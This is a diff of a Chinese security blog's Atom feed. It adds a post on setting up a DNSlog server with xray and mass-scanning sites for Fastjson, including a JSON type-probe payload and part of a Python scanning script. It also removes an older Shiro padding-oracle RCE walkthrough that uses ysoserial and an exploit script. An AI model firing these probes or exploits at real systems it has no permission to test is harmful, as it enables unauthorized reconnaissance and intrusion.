@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2020-04-04T07:16:20.450Z</updated>
+    <updated>2020-04-11T13:08:11.847Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,158 @@
     <logo>http://www.svenbeast.com/images/avatar.png</logo>
     <icon>http://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2020, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[搭建自己的dnslog平台并以此来发现Fastjson资产]]></title>
+        <id>http://www.svenbeast.com/post/16--phe4I/</id>
+        <link href="http://www.svenbeast.com/post/16--phe4I/">
+        </link>
+        <updated>2020-04-11T11:44:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01">0x01 ^$&amp;!#@*</h3>
+<pre><code>因为ceye总是宕机，dnslog不适合脚本化查询，
+所以就需要用自己的平台了，
+记录借助xray建立dnslog平台并以此来检测fastjson资产的过程（xray官方文档没写全，踩了点小坑）
+</code></pre>
+<h3 id="0x02-准备零件">0x02 准备零件</h3>
+<ul>
+<li>
+<ol>
+<li>一台服务器，最低配置都没事，能运行xray就行（设为我的服务器ip为：123.321.213.2）</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>在阿里云购买域名（dnslog.cool）其他处不行哦，免费域名厂商的应该也可以，因为需要有设定DNS Host的功能</li>
+</ol>
+</li>
+</ul>
+<h3 id="0x03-配置过程">0x03 配置过程</h3>
+<pre><code>https://wanwang.aliyun.com/?spm=5176.12825654.eofdhaal5.9.3dbd2c4apKHcoB&amp;aly_as=TNeZQ8Wpi
+</code></pre>
+<ul>
+<li>
+<ol>
+<li>此处购买域名，任意即可，因本人强迫症，购买dnslog.cool，跟随阿里云的购买流程即可，配置邮箱，配置个人信息等</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>自定义DNS Host：等待实名认证审核完成，一般10到20分钟即可，前往自定义DNS Host功能处创建2个DNS服务器，比如设置sven1.dnslog.cool,sven2.dnslog.cool，IP地址填写服务器ip:123.321.213.2<br>
+<img src="http://www.svenbeast.com//post-images/1586606506182.png" alt="" loading="lazy"></li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>DNS修改：前往DNS修改功能，修改dns服务器为sven1.dnslog.cool,sven2.dnslog.cool</li>
+</ol>
+</li>
+<li>
+<ol start="4">
+<li>域名解析：然后点击左边的域名解析功能，填加2条解析记录，主机记录填写sven1，记录类型为A，解析线路为默认，记录值为123.321.213.2(我的服务器ip)，剩下默认即可，第二条解析记录的主机记录填写sven2，其他同上条<br>
+<img src="http://www.svenbeast.com//post-images/1586607388972.png" alt="" loading="lazy"></li>
+</ol>
+</li>
+<li>
+<ol start="5">
+<li>确定域名的实名认证审核完成后，登录服务器（必须拥有独立外网ip的哦），下载xray，先使用命令行xray.exe reverse运行一遍，自动生成config.yaml，然后打开config.yaml，找到配置反连平台得配置（270行上下十来行都是），替换成如下程度，按照自己实际情况更换密码和ip和域名和dns服务器的前缀后运行xray（xray.exe reverse），运行完毕后访问链接：http://123.321.213.2:8001，就是dnslog管理平台了</li>
+</ol>
+</li>
+</ul>
+<pre><code>reverse:
+  db_file_path: &quot;reverse.db&quot;
+  token: &quot;123!@#QWE&quot;           //此处是设置登录反连平台得密码      
+  http:
+    enabled: true
+    listen_ip: 0.0.0.0
+    listen_port: &quot;8001&quot;
+  dns:
+    enabled: true
+    listen_ip: 0.0.0.0
+    domain: &quot;dnslog.cool&quot;
+    is_domain_name_server: false
+    # 静态解析规则
+    resolve:
+    - type: A
+      record: sven1
+      value: 123.321.213.2
+      ttl: 60
+    - type: A
+      record: sven2
+      ttl: 60
+      value: 123.321.213.2
+  rmi:
+    enabled: true
+    listen_ip: 0.0.0.0
+    listen_port: 8088
+    resolve:
+    - type: A # A, AAAA, TXT 三种
+      record: localhost
+      value: 127.0.0.1
+      ttl: 60
+  client:
+    http_base_url: &quot;&quot;
+    dns_server_ip: &quot;123.321.213.2&quot;
+    remote_server: false
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1586608033853.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<ol start="6">
+<li>生成用来检测的域名：复制好后直接ping xxxxxx.dnslog.cool即可收到请求<br>
+<img src="http://www.svenbeast.com//post-images/1586608380495.png" alt="" loading="lazy"><br>
+<img src="http://www.svenbeast.com//post-images/1586608485494.png" alt="" loading="lazy"></li>
+</ol>
+</li>
+</ul>
+<h3 id="0x04-fastjson资产检测">0x04 fastjson资产检测</h3>
+<p>利用dnslog回显检测后端是否使用fastjson</p>
+<pre><code>Payload之一: 
+{&quot;e&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;hbs9jr.dnslog.cn&quot;}}
+
+</code></pre>
+<p><img src="http://www.svenbeast.com//post-images/1586609667744.png" alt="" loading="lazy"><br>
+<img src="http://www.svenbeast.com//post-images/1586609743542.png" alt="" loading="lazy"></p>
+<p>这样我的批量多线程检测脚本也就完成了，当然也只是一种思路，还有其他增加检测率的方法，部分代码如下</p>
+<pre><code>        try:
+
+            randStr = ''.join(random.sample(string.ascii_letters + string.digits, 4))
+            dnslog = '{'+'&quot;e&quot;:'+'{'+'&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;p-1111-pgfx.{}.dnslog.cool&quot;'.format(randStr)+'}'+'}'
+            line=line.strip('\n')
+
+            k = requests.get(line,headers=fastjson_header,data=dnslog,allow_redirects=False,verify=False,timeout=10)
+            time.sleep(1)
+            check = 'http://11111111111:8001/_/api/event/list?lastID=&amp;count=5&amp;eventType=dns&amp;action=Next'
+            wb_data = requests.get(check,headers=check_header,timeout=10)
+            req = wb_data.text
+
+            if randStr in req:
+                print(&quot;[+ &quot;+&quot; 存在fastjson: &quot;+&quot;状态码:&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line)
+                f.write(line+&quot;\n&quot;)
+            else:
+                print(&quot;[- &quot;+&quot; 不存在fastjson  &quot;+&quot;状态码:&quot;+str(k.status_code)+&quot;:&quot;+' url:'+line)
+        except Exception as e:
+            print(e)
+            pass
+</code></pre>
+<h3 id="吐槽">吐槽</h3>
+<ul>
+<li>
+<ol>
+<li>xray说明文档未写清需要去域名解析配置dns服务器的解析</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>浪费了一个域名，dnslog.run，在腾讯云买的，没有自定义dnslog服务器功能（谁要我转手...）</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>所以都怪ceye没事宕个机 -.- !</li>
+</ol>
+</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Shiro反序列化利用工具ShiroScan代码重构，速度增加300%，成功率增加30%]]></title>
         <id>http://www.svenbeast.com/post/tskRKJIPg/</id>
@@ -488,70 +640,6 @@ remote_port = 4446
 <p>https://github.com/sv3nbeast/CVE-2019-1388</p>
 <h2 id="0x00-手动过程">0x00 手动过程</h2>
 <figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1574822658405.gif" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Shiro<=1.4.1 padding oracle attack导致RCE]]></title>
-        <id>http://www.svenbeast.com/post/-leT8b8Kh/</id>
-        <link href="http://www.svenbeast.com/post/-leT8b8Kh/">
-        </link>
-        <updated>2019-11-18T03:34:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
-<pre><code>shiro是一个java场景使用较多组件，最近曝出因使用了 AES-128-CBC 模式对cookie进行加密，so可
-以padding oracle攻击构造数据进行反序列化攻击
-
-影响版本： 1.2.4&lt;shiro&lt;=1.4.1
-</code></pre>
-<h3 id="0x02-环境">0x02 环境</h3>
-<pre><code>靶机：windows10 + tomcat + shiro1.4.1
-shiro环境：https://pan.baidu.com/s/1E72vhls9oOI-ny4luDTi3A 提取码: uakn
-
-攻击机：windows10 + burpsuite + python
-Exp：https://xxx.com
-</code></pre>
-<h3 id="0x03-复现">0x03 复现</h3>
-<ul>
-<li>
-<p>1.靶机shiro环境正常显示<br>
-<img src="http://www.svenbeast.com//post-images/1574049005371.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>2.登录<br>
-<img src="http://www.svenbeast.com//post-images/1574057606280.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>3.生成payload.class</p>
-</li>
-</ul>
-<pre><code>java -jar ysoserial.jar CommonsCollections1 &quot;ping dnslog.com&quot; &gt; payload.class
-</code></pre>
-<ul>
-<li>
-<p>4.取cookie的rememberMe值<br>
-<img src="http://www.svenbeast.com//post-images/1574058036133.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>5.生成恶意rememberMe值</p>
-</li>
-</ul>
-<pre><code>需输入3个参数，目标url，正常rememberMe值，payload.class，我跑了应该是20分左右，具体没看
-&gt;&gt;python2 shiro_exp.py http://172.20.10.3:8080/shiro-1.4.1/home.jsp rememberMe值 payload.class
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1575447759689.png" alt="" loading="lazy"></figure>
-<ul>
-<li>6.使用生成的恶意rememberMe值进行访问</li>
-</ul>
-<pre><code>PS：此处访问需要先退出刚才的登录，在未登录情况下使用恶意remeberMe进行访问，由此才可造成RCE
-同时也可理解为，获得一次任意登录后得remeberMe值后，以后再利用则无需获取新的值,想要执行其他命令，继续使用初始的remeberMe值进行遍历。
-</code></pre>
-<p><img src="http://www.svenbeast.com//post-images/1575447389761.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1575447533249.png" alt="" loading="lazy"></p>
-<h3 id="0x04-坑点">0x04 坑点</h3>
-<ul>
-<li>1.耗费时间</li>
-<li>2.需要注销后进行注入恶意rememberMe访问，差点自闭，毕竟无参考且没人提过，或者我姿势不对？？</li>
-<li>3.友情提示不要用linux虚拟机当做靶机进行遍历，虚拟机会内存红色告急，可以先快照试试，不过不一定管事 （默默超心痛我的kali机，-.-!）</li>
-</ul>
 ]]></content>
     </entry>
 </feed>
